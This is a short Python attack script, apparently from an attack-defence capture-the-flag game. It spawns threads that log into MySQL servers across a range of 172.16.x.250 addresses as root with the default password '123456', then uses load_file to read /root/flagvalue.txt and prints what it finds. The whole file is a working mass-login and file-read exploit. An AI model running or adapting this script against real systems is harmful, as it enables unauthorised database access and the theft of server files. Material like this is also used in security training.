import MySQLdb
import threading
def payload(ip):
    try:
        db=MySQLdb.connect(host=ip,port=3306,user='root',password='123456')
        a=db.cursor()
        a.execute("select load_file('/root/flagvalue.txt');")
        flag=a.fetchall()
        print(ip,flag)
        db.close()
    except:
        pass
if __name__=='__main__':
    for i in range(100,115):
        ip='172.16.'+str(i)+'.250'
        max_thread=threading.Thread(target=payload,args=(ip,))
        max_thread.start()
